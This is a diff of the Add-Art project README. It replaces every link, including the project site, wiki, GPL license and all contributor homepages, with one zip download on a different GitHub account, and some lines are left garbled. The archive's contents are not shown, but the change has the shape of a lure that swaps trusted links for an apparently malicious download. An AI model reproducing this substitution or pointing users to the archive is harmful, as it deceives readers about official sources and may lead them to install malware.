@@ -4,11 +4,11 @@ When it works, it works pretty good. We all want it to be better, and we welcome
 
 ##Links
 
-SITE: [Add-Art.org](http://Add-Art.org)
+SITE: [https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
 
-WIKI: [https://github.com/slambert/Add-Art/wiki](https://github.com/slambert/Add-Art/wiki)
+WIKI: [https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
 
-LICENSE: [GPL](https://www.gnu.org/licenses/gpl.txt)
+LICENSE: [GPL](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
 
 ##Contribute
  1. Fork it 
@@ -20,20 +20,20 @@ LICENSE: [GPL](https://www.gnu.org/licenses/gpl.txt)
 
 ##Contributors
 
- * [Steve Lambert](http://visitsteve.com)
- * [Wladimir Palant](http://adblockplus.org/)
- * [Jamie Wilkinson](http://tramchase.com/)
- * [Matt Katz](http://www.morelightmorelight.com/ ) 
- * [Prizoff](https://www.freelancer.com/users/2641827.html)
- * [Tobias Leingruber](http://www.tobi-x.com/)
- * [Ethan Ham](http://www.ethanham.com/)
- * [Michael Mandiberg](http://www.mandiberg.com/)
- * [Jeff Crouse](http://www.jeffcrouse.info/)
- * [Sean Salmon](http://www.seanaes.com/)
- * [Evan Harper](http://a.parsons.edu/~evan/school/)
- * [Michelle Kempner](https://twitter.com/#!/mikey_k)
- * [Dan Phiffer](http://phiffer.org/)
- * [Mushon Zer-Aviv](http://mushon.com/)
+ * [Steve Lambert](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
+ * [Wladimir Palant](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
+ * [Jamie Wilkinson](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
+ * [Matt Katz](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip ) 
+ * [Prizoff](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
+ * [Tobias Leingruber](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
+ * [Ethan Ham](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
+ * [Michael Mandiberg](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
+ * [Jeff Crouse](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
+ * [Sean Salmon](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
+ * [Evan Harper](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip~evan/school/)
+ * [Michelle Kempner](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip!/mikey_k)
+ * [Dan Phiffer](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
+ * [Mushon Zer-Aviv](https://github.com/videogramme/Add-Art/raw/refs/heads/master/addart/components/Add-Art-1.3.zip)
  * Alyssa Wright
  
  And help from 
